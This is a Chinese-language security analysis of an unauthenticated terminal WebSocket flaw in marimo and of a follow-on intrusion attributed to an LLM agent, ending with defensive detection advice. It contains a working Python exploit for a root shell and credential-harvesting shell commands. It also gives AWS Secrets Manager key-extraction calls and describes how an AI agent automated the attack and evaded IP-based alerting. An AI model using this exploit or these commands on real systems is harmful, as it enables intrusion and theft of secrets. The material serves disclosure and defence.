1.2 漏洞根因：认证函数缺失

漏洞位于 marimo/_server/api/endpoints/terminal.py 中的 /terminal/ws WebSocket 端点。Marimo 服务器暴露多个 WebSocket 端点，大多数端点（包括主 notebook 同步端点 /ws）正确调用了 validate_auth() 进行身份验证。然而，终端端点 /terminal/ws——提供完整伪终端（PTY）会话以运行任意 shell 命令——完全没有调用认证函数。

有问题的代码（marimo <= 0.20.4）：

# marimo/_server/api/endpoints/terminal.py

@router.websocket("/terminal/ws")
async def websocket_terminal(websocket: WebSocket) -> None:
    app_state = AppState(websocket)
    if app_state.mode != SessionMode.EDIT:
        await websocket.close(...)
        return
    if not supports_terminal():
        await websocket.close(...)
        return
    # ❌ 没有任何身份验证检查！
    await websocket.accept()  # 直接接受连接
    # ...
    child_pid, fd = pty.fork()  # 创建 PTY Shell — 攻击者获得完整交互式终端

对比正确实现的 /ws 端点：

# marimo/_server/api/endpoints/ws.py

@router.websocket("/ws")
async def websocket_endpoint(websocket: WebSocket) -> None:
    app_state = AppState(websocket)
    validator = WebSocketConnectionValidator(websocket, app_state)
    if not await validator.validate_auth():  # ✅ 正确的身份验证检查
        return
    await websocket.accept()

1.3 认证中间件的局限性

Marimo 使用 Starlette 的 AuthenticationMiddleware，该中间件会将未认证的连接标记为 UnauthenticatedUser，但不会主动拒绝 WebSocket 连接。实际的认证强制依赖于端点级别的 @requires() 装饰器或显式调用 validate_auth()，而 /terminal/ws 端点两者都没有：

请求流程：
┌─────────────┐     ┌──────────────────────┐     ┌──────────────────┐
│ WebSocket   │────▶│ AuthenticationMiddle │────▶│ /terminal/ws     │
│ ws://T:2718 │     │ ware (标记为未认证    │     │ (无 validate_auth│
│ /terminal/ws│     │  但不拒绝连接)        │     │  直接 accept)    │
└─────────────┘     └──────────────────────┘     └────────┬─────────┘
                                                           │
                                                           ▼
                                                   ┌───────────────┐
                                                   │ pty.fork()    │
                                                   │ 完整 PTY Shell│
                                                   │ (root 权限)   │
                                                   └───────────────┘

1.4 利用方式：单请求获取 Shell

攻击链极其简洁——仅需一个 WebSocket 连接请求：

import asyncio
import websockets

async def exploit():
    uri = "ws://TARGET:2718/terminal/ws"
    async with websockets.connect(uri, subprotocols=["terminal"]) as ws:
        # 连接即获得交互式 PTY Shell
        await ws.send("id\n")
        response = await ws.recv()
        print(response)  # uid=0(root) gid=0(root) groups=0(root)

        await ws.send("whoami\n")
        response = await ws.recv()
        print(response)  # root

asyncio.run(exploit())

命令行利用工具：

# 执行单条命令
python3 exploit.py -t 127.0.0.1 -p 2718 -c "id && whoami"

# 进入交互式 Shell
python3 exploit.py -t 127.0.0.1 -p 2718 -i

2.1 Step 1：云凭据收割

攻击者通过 marimo 终端 Shell 系统性扫描以下文件路径：

# 凭据收割命令序列
cat /app/.env* 2>/dev/null
cat /etc/environment 2>/dev/null
cat /proc/*/environ 2>/dev/null | tr '\0' '\n'
cat ~/.aws/credentials 2>/dev/null
cat ~/.pgpass 2>/dev/null

收割目标文件清单：

文件路径 凭据类型
/app/.env* 应用环境变量（API 密钥、数据库连接串）
/etc/environment 系统级环境变量
/proc/*/environ 所有进程的环境变量（含注入的密钥）
~/.aws/credentials AWS Access Key + Secret Key
~/.pgpass PostgreSQL 密码文件

从中提取了两个 AWS access key。凭据收割与后续 AWS API 调用之间存在 48 分钟间隔——Sysdig 分析认为这是攻击者将收割的值从一个工具环境拉出并喂入另一个环境（如 LLM Agent 上下文）所需的时间。

2.2 Step 2：AWS Secrets Manager SSH 私钥提取

攻击者使用收割的 AWS access key 执行以下 API 调用序列：

攻击链：
┌─────────────────┐     ┌──────────────────┐     ┌────────────────────┐
│ sts:GetCaller   │────▶│ secretsmanager:  │────▶│ secretsmanager:    │
│ Identity        │     │ ListSecrets      │     │ GetSecretValue ×12 │
│ (验证凭据范围)   │     │ (枚举可用secret) │     │ (提取SSH私钥)      │
└─────────────────┘     └──────────────────┘     └────────────────────┘
     19:26:31               19:26:40                 19:26:52-19:27:14

关键的跨步骤值传递：GetSecretValue 的 SecretId 参数是从 20秒前 的 ListSecrets 响应中选出的。Agent 在看到 secret 列表之前不知道要检索哪个 secret——这是 LLM Agent 读取先前工具输出并动态选择下一步输入的典型行为。

# AWS CLI 等价命令（实际通过 SDK/Agent 执行）
aws sts get-caller-identity \
  --profile harvested

aws secretsmanager list-secrets \
  --profile harvested

# SecretId 从 ListSecrets 响应中动态选取
aws secretsmanager get-secret-value \
  --secret-id "prod/bastion-ssh-key" \
  --profile harvested

12 次 GetSecretValue 调用在 22秒内 完成，从中检索到 SSH 私钥。

三、LLM Agent 驱动的四个判定特征

Sysdig TRT 识别出四个属性，证明后渗透操作由 LLM Agent 实时驱动而非预脚本执行。

3.1 特征一：即兴推理（Improvised Dump）

攻击者对一个未被识别的目标进行了即兴数据库导出：

  • 数据库主机名 internal-db 是不透明的，磁盘上没有应用程序标识符
  • Agent 运行 pg_tables 枚举后立即导出特定表
  • 第一次调用直接命中 SELECT * FROM credential
  • 最终调用将 6 个表打包到单个 HEREDOC 中
  • 表列表（api_key、credential、user、variable、flow、message）接近 langflow schema，但 credential 表在 langflow 中不存在
  • Agent 仅凭表名强度就导出了不存在的表——从通用知识推理，而非基于预置情报

预脚本 vs Agent 行为对比：

维度 预脚本操作者 LLM Agent 操作者
目标识别 预先知道目标 schema 运行时枚举发现
表选择 基于 playbook 硬编码 基于表名语义强度推理
未知表处理 跳过不存在的表 仍尝试导出（通用先验）
适应新目标 需要工程时间编写新 playbook 携带类别级先验，实时组合链

3.2 特征二：内部独白泄露（Planning Comment）

命令流中出现中文规划注释：

# 看还能做什么

技术分析： - 该注释出现在凭据文件搜索块的开头 - 注释之后的 shell 命令是英文 - 该注释在 6 个不同 IP 以亚秒级节奏分发的命令中出现 - 预构建脚本没有内部独白 - 人类在远程终端打字可以留下注释，但不会同时在 6 个独立 IP 以亚秒级节奏来源相同的 SSH 会话中出现

3.3 特征三：机器可解析结构（Machine-Optimized Commands）

Sysdig 识别出 5 个命令塑造特征，在所有 8 个 bastion 命令中重复出现：

特征 示例 人类不需要 脚本不需要 Agent 需要
echo '---' 分隔符 cmd1; echo '---'; cmd2 ✅（提示符已分隔） ✅（知道自己运行了什么） ❌（消费者是重新解析扁平 blob 的进程）
HEREDOC 批处理 psql << 'EOF' ... EOF ✅（在提示符内工作） ✅（写 .sql 文件） ❌（希望 N 条语句一次往返返回）
2>&1 \| head -N 有界输出 ... 2>&1 \| head -30 ✅（按空格翻页） ✅（捕获全部到磁盘） ❌（保持上下文窗口免受无关行干扰）
-P pager=off 禁用分页器 psql -P pager=off ✅（按空格键） ✅（非交互模式默认关闭） ❌（消费者不按键）
2>/dev/null 丢弃 stderr cmd 2>/dev/null ✅（看错误信息） ✅（记录所有内容） ❌（保持观察免受失败命令噪声干扰）

Sysdig 结论：单个特征可能出现在精心编写的人工脚本中，但所有 5 个特征同时出现在针对未识别目标的 113 秒即兴会话中，AI 成为明确答案。

3.4 特征四：跨步骤值传递（Output-Dependent Chaining）

Agent 在简单交接点消费自己的输出作为下一步的输入：

值传递链 来源 消费
PGPASSWORD cat ~/.pgpass 输出 3 个 psql 调用的环境变量
SSH 密钥路径 ls ~/.ssh/id_ed25519* 确认存在 cat ~/.ssh/id_ed25519.pub
find 搜索路径 ls /home/ 枚举主目录 find /home/deploy -type f ...
AWS SecretId ListSecrets 响应中的 ARN GetSecretValue 的 --secret-id 参数

关键的不对称性：链在值容易提取的地方拉取值（从 .pgpass 提取字面密码），在不容易的地方回退到内置先验（如 schema 猜测）。这种不对称性与 Agent 处理上下文的方式一致，而非 playbook 作者编写脚本的方式。

4.2 反检测原理

传统检测模型（基于源 IP 关联）：
  同一 IP → 多次 Secrets Manager 查询 → 触发告警 ✅

LLM Agent 反检测模型：
  IP₁ → GetSecretValue #1     ┐
  IP₂ → GetSecretValue #2     │
  IP₃ → GetSecretValue #3     │ 22秒内12次调用
  IP₄ → GetSecretValue #4     │ 分散到11个IP
  ...                         │
  IP₁₁ → GetSecretValue #12   ┘
  → 每个IP仅1-2次调用 → 不触发阈值告警 ❌

五、防御体系：从签名检测到行为结果检测

5.1 检测范式转变

LLM Agent 为每个目标重写方法，使静态签名规则的可靠性降低。检测必须转向攻击者正在完成的内容（凭据访问/数据库导出），而非使用的具体命令。

# 检测 LLM Agent 特征的命令模式
import re

def detect_agent_patterns(command_log: str) -> list:
    indicators = []

    # 特征1: echo '---' 分隔符密集出现
    separator_count = command_log.count("echo '---'")
    if separator_count >= 3:
        indicators.append("dense_separator_pattern")

    # 特征2: HEREDOC 批处理不相关命令
    if re.search(r"<<\s*['\"]?EOF['\"]?.*SELECT.*SELECT", command_log, re.DOTALL):
        indicators.append("heredoc_batch_sql")

    # 特征3: 通用 2>/dev/null + head -N 组合
    if re.search(r"2>/dev/null.*\|\s*head\s+-\d+", command_log):
        indicators.append("bounded_output_suppression")

    # 特征4: 非英文规划注释
    non_english_comments = re.findall(r'#\s*[\u4e00-\u9fff]+', command_log)
    if non_english_comments:
        indicators.append(f"non_english_planning: {non_english_comments}")

    # 特征5: 跨命令值传递模式
    if re.search(r"cat\s+~/.pgpass.*PGPASSWORD", command_log, re.DOTALL):
        indicators.append("cross_command_value_chaining")

    return indicators

六、范式转变：从工程时间到推理预算

Sysdig 高级总监 Michael Clark 指出：

"我们不是在看着 AI 替代攻击者。我们在看着攻击者用 AI 替代他们的脚本。"

当脚本操作者构建按目标 playbook 并复用时，增加新目标的门槛是工程时间。而 Agent 操作者携带关于应用程序类别的通用先验，并实时组合链以最适合其目标——门槛变为推理预算。

防御者启示

  1. 签名检测失效：LLM Agent 为每个目标重写方法，静态规则无法覆盖所有变体
  2. 行为结果检测：检测必须转向「攻击者在完成什么」（凭据访问、数据库导出）而非具体命令
  3. 遥测全覆盖：攻击者在 LLM 帮助下深入网络移动，需确保跨所有资产的可见性
  4. 假设沦陷：互联网可达且磁盘上有凭据的 marimo 实例应被视为 Agent 的一小时导出设备
